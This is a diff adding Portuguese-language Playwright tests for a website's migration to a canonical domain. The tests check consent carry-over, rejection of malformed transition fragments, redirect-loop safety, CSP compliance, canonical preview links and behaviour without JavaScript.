+test('H1 navegador: consentimento recusado no antigo chega recusado no novo (sem banner, sem Pixel)', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav);
+    await semear(pg, A, { 'creat:consentimento': CONSENT(false) });
+    await pg.goto(A + '/abrir/#plano=vitrine&k=salao&n=Studio%20Bela&c=Salvador&p=1');
+    await pg.waitForURL((x) => x.hostname === HN);
+    await pg.waitForFunction(() => document.documentElement.classList.contains('js-pronto'));
+    await pausa(800);
+    assert.equal(new URL(pg.url()).hash.indexOf('m=v1'), -1);
+    assert.equal(await pg.evaluate(() => document.querySelector('#consentimento').hidden), true, 'sem banner: a escolha veio do antigo');
+    assert.equal(await pg.evaluate(() => typeof window.fbq), 'undefined');
+    assert.equal(reg.terceiros.filter((t) => /facebook|clarity/.test(t.url)).length, 0);
+    assert.equal(await pg.textContent('#abrir-negocio-nome'), 'Studio Bela', 'o fragmento original foi devolvido à página');
+    const ls = await lerLS(pg, N);
+    assert.equal(JSON.parse(ls['creat:consentimento']).pixel, false);
+    assert.equal(JSON.parse(ls['creat:consentimento']).em, EM, 'o prazo de 180 dias continua do mesmo dia');
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: fragmento de transição malformado, gigante ou com chave extra é ignorado sem erro e some da barra', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const agora = Math.floor(Date.now() / 1000);
+    const bom = { v: 1, p: { i: ID, s: SEGREDO, pl: 'vitrine', k: 'salao', n: 'Studio Bela & Cia', st: 'enviado', t: agora - 60 } };
+    const casos = {
+      malformado: 'm=v1.@@@~k=salao&p=2',
+      gigante: 'm=v1.' + C.paraB64(JSON.stringify(Object.assign({}, bom, { lixo: 'x'.repeat(5000) }))) + '~k=salao&p=2',
+      'chave extra': 'm=v1.' + C.paraB64(JSON.stringify({ v: 1, p: Object.assign({}, bom.p, { whatsapp: '5575991234567' }) })) + '~k=salao&p=2',
+      'json quebrado': 'm=v1.' + C.paraB64('{"v":1,"p":') + '~k=salao&p=2',
+      'versão nova': 'm=v2.' + C.paraB64(JSON.stringify(bom)) + '~k=salao&p=2'
+    };
+    for (const [nome, frag] of Object.entries(casos)) {
+      const { ctx, pg, reg } = await abrir(nav);
+      await pg.goto(N + '/termos/#' + frag);
+      await pg.waitForFunction(() => document.documentElement.classList.contains('js-pronto'));
+      assert.equal(pg.url(), N + '/termos/#k=salao&p=2', nome + ': a barra fica só com o fragmento original');
+      const ls = await lerLS(pg, N);
+      assert.equal(ls['creat:pedido:v1'], undefined, nome + ': nada gravado');
+      assert.deepEqual(reg.erros, [], nome);
+      semSegredo(reg, nome);
+      await ctx.close();
+    }
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: no novo, em localhost, em file://, em outro host e em moldura nada redireciona; configuração errada não cria laço', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav);
+    for (const p of ['/', '/abrir/', '/obrigado/?resultado=pendente', '/termos/', '/privacidade/', '/bastidores/', '/previa/#k=salao&n=Studio&p=1', '/nao-existe/']) {
+      reg.navs.length = 0;
+      await pg.goto(N + p);
+      await pausa(400);
+      assert.equal(new URL(pg.url()).origin, N, p);
+      assert.equal(reg.navs.length, 1, 'novo sem troca: ' + p + ' ' + reg.navs.join(' > '));
+    }
+    reg.navs.length = 0;
+    await pg.goto(O + '/termos/'); await pausa(400);
+    assert.equal(new URL(pg.url()).origin, O, 'outro host fica'); assert.equal(reg.navs.length, 1);
+    // moldura: a prévia no quadro da home, mesmo no antigo, nunca troca sozinha
+    await semear(pg, A, {});
+    const quadro = await pg.evaluate((u) => new Promise((ok) => { const f = document.createElement('iframe'); f.src = u; f.onload = () => { try { ok(f.contentWindow.location.href); } catch (e) { ok('cruzou'); } }; document.body.appendChild(f); }), A + '/previa/#k=salao&p=1');
+    assert.equal(quadro, A + '/previa/#k=salao&p=1', 'a moldura não trocou');
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+    // configuração errada: canônico também na lista de antigos, e outro host como antigo; o canônico nunca sai de si
+    const b = await abrir(nav, { config: [HN, HO, HA] });
+    b.reg.navs.length = 0;
+    await b.pg.goto(N + '/termos/'); await pausa(500);
+    assert.equal(b.pg.url(), N + '/termos/'); assert.equal(b.reg.navs.length, 1);
+    b.reg.navs.length = 0;
+    await b.pg.goto(O + '/termos/'); await b.pg.waitForURL((x) => x.hostname === HN); await pausa(500);
+    assert.deepEqual(b.reg.navs.map((x) => new URL(x).hostname), [HO, HN]);
+    await b.ctx.close();
+    // localhost (http) e file://
+    const srv = http.createServer((q, r) => { const f = arquivo(new URL(q.url, 'http://x').pathname); if (!f) { r.writeHead(404); return r.end(); } r.writeHead(200, { 'content-type': MIME[path.extname(f)] || 'application/octet-stream' }); fs.createReadStream(f).pipe(r); });
+    await new Promise((ok) => srv.listen(0, '127.0.0.1', ok));
+    const local = await nav.newPage();
+    const navsL = []; local.on('framenavigated', (f) => { if (f === local.mainFrame()) navsL.push(f.url()); });
+    const base = 'http://127.0.0.1:' + srv.address().port;
+    await local.goto(base + '/termos/'); await pausa(500);
+    await local.goto('http://localhost:' + srv.address().port + '/termos/'); await pausa(500);
+    await local.goto(pathToFileURL(path.join(RAIZ, 'termos', 'index.html')).href); await pausa(500);
+    assert.deepEqual(navsL.map((x) => new URL(x).protocol + new URL(x).hostname), ['http:127.0.0.1', 'http:localhost', 'file:']);
+    await local.close(); srv.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: com a CSP de _headers, a troca e as páginas rodam sem violação e sem erro', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav, { csp: true });
+    await semear(pg, A, { 'creat:pedido:v1': PEDIDO_CHEIO(), 'creat:consentimento': CONSENT(true) });
+    for (const p of ['/', '/abrir/#plano=vitrine&k=salao&n=Studio&c=Salvador&p=1', '/obrigado/?resultado=pendente&pago=mp&produto=pa-abertura-inauguracao', '/termos/', '/privacidade/', '/bastidores/', '/previa/#k=salao&n=Studio&p=1', '/nao-existe/']) {
+      await pg.goto(A + p);
+      await pg.waitForURL((x) => x.hostname === HN);
+      await pausa(600);
+      assert.doesNotMatch(pg.url(), /m=v1/, p);
+    }
+    assert.deepEqual(reg.console.filter((m) => /Content Security Policy|Refused/i.test(m)), [], 'sem violação de CSP');
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: link da prévia copiado e link da prévia gravado no pedido nascem no canônico', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const { ctx, pg, reg } = await abrir(nav);
+    await ctx.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: N });
+    await semear(pg, N, { 'creat:consentimento': CONSENT(false) });
+    await pg.goto(N + '/abrir/#plano=vitrine&k=salao&n=Studio%20Bela&c=Salvador&p=2');
+    await pg.click('#abrir-voltar');
+    await pg.waitForFunction(() => !document.querySelector('#previa').hidden);
+    await pg.click('#previa-copiar');
+    await pg.waitForFunction(() => navigator.clipboard.readText().then((t) => !!t));
+    assert.match(await pg.evaluate(() => navigator.clipboard.readText()), /^https:\/\/nuvem\.creatmtt\.com\.br\/previa\/#k=salao&n=Studio%20Bela&c=Salvador&p=[123]$/);
+    await pg.goto(N + '/abrir/#plano=vitrine&k=salao&n=Studio%20Bela&c=Salvador&p=2');
+    await pg.waitForFunction(() => document.querySelector('.pagar [data-checkout]').getAttribute('data-link-ok') === '1');
+    await pg.fill('#p-responsavel', 'Maria Souza'); await pg.fill('#p-whatsapp', '75991234567');
+    await pg.fill('#p-endereco', 'Rua das Flores, 120, Centro, Feira de Santana-BA, 44001-000'); await pg.fill('#p-email', 'maria@exemplo.com.br');
+    await pg.check('#p-aceite');
+    await Promise.all([pg.waitForURL(/mercadopago/), pg.click('.pagar [data-checkout]')]);
+    const ls = await lerLS(pg, N);
+    assert.match(JSON.parse(ls['creat:pedido:v1']).previa, /^https:\/\/nuvem\.creatmtt\.com\.br\/previa\/#k=salao&n=Studio%20Bela&c=Salvador&p=2$/);
+    assert.deepEqual(reg.erros, []);
+    await ctx.close();
+  } finally { await nav.close(); }
+});
+
+test('H1 navegador: sem JavaScript o antigo continua de pé; troca que não completa mostra a página e libera a vitrine', { skip: pular }, async () => {
+  const nav = await chromium.launch();
+  try {
+    const a = await abrir(nav, { contexto: { javaScriptEnabled: false } });
+    for (const p of ['/', '/termos/', '/obrigado/?resultado=pendente']) {
+      await a.pg.goto(A + p);
+      await pausa(300);
+      assert.equal(a.pg.url(), A + p, 'sem JavaScript fica no antigo: ' + p);
+      const vis = await a.pg.locator('body').isVisible();
+      assert.equal(vis, true, p);
+      assert.ok((await a.pg.innerText('body')).length > 200, 'conteúdo na tela: ' + p);
+    }
+    await a.ctx.close();
+    // o novo não responde nunca: a página do antigo fica escondida no máximo 2,5 s e volta sozinha; a vitrine volta em 8 s
+    const b = await abrir(nav, { prenderNovo: true });
+    const t0 = Date.now();
+    await b.pg.goto(A + '/termos/', { waitUntil: 'commit' });
+    await b.pg.waitForFunction(() => !!window.CreatCanonico);
+    assert.equal(await b.pg.evaluate(() => window.CreatCanonico.mudando && getComputedStyle(document.documentElement).visibility), 'hidden', 'escondida enquanto troca');
+    await b.pg.waitForFunction(() => getComputedStyle(document.documentElement).visibility === 'visible', null, { timeout: 5000 });
+    const mostrou = Date.now() - t0;
+    assert.ok(mostrou < 4000, 'mostrou em ' + mostrou + ' ms');
+    await b.pg.waitForFunction(() => document.documentElement.classList.contains('js-pronto'), null, { timeout: 12000 });
+    assert.equal(new URL(b.pg.url()).origin, A);
+    assert.deepEqual(b.reg.erros, []);
+    await b.ctx.close();
+  } finally { await nav.close(); }
+});
